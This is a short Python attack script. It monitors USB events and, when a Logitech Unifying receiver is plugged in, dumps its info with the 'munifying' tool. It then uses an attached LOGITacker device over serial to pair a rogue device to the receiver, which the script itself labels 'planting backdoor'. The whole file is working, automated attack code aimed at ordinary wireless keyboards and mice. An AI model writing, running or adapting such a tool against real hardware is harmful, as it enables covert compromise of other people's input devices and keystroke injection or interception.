import pyudev, os, serial
from colorama import Fore, Back, Style

if os.getuid() != 0:
	print("You need a sudo to run this!")
	exit()
try:
	mpath = '~/go/bin/' # Insert your munifying path here!
	logitacker = False
	context = pyudev.Context()
	monitor = pyudev.Monitor.from_netlink(context)
	monitor.filter_by(subsystem='usb')
	monitor.filter_by(subsystem='tty')
	devices = context.list_devices()
	for device in devices:
		if device.get('ID_VENDOR_ID') in ['1915'] and not logitacker:
			logitacker = True
			print((Fore.GREEN + "Logitacker present!" + Style.RESET_ALL))

	for action, device in monitor:
		vendor_id = device.get('ID_VENDOR_ID')
		if vendor_id in ['1915']:
			if action in ["bind","add"]:
				logitacker = True
				print((Fore.GREEN + "Logitacker present!" + Style.RESET_ALL))
			elif action == "remove":
				logitacker = False
				print((Fore.RED + "Logitacker disconnected! :(" + Style.RESET_ALL))
	
		if vendor_id in ['046d']:
			print('Detected {} for device with vendor ID {}'.format(action, vendor_id))
			if action == "bind":
				print((Fore.YELLOW + "(1/3) Dumping..." + Style.RESET_ALL))
				minfo = os.popen(mpath + 'munifying info').read()
				print(minfo)
	
				if logitacker and "LOGITacker" not in minfo:
					minfo = None
					print((Fore.YELLOW + "(2/3) Plantting backdoor!..." + Style.RESET_ALL))
					ser = serial.Serial('/dev/ttyACM0')
					ser.write(b'\npair device run\n')
					print(os.popen(mpath + 'munifying pair').read())
					print((Fore.YELLOW + "(3/3) Attempt #2? just to be sure" + Style.RESET_ALL))
					ser.write(b'\npair device run\n')
					ser.close()
					print((Fore.GREEN + "Done!" + Style.RESET_ALL))
				else:
					print((Fore.YELLOW + "(2/3) Skipping backdoor" + Style.RESET_ALL))
					print((Fore.YELLOW + "(3/3) Done!" + Style.RESET_ALL))
			elif action == "remove":
				print((Fore.RED + "Target disconnected!" + Style.RESET_ALL))
except KeyboardInterrupt:
	print(" Bye!")
	exit()
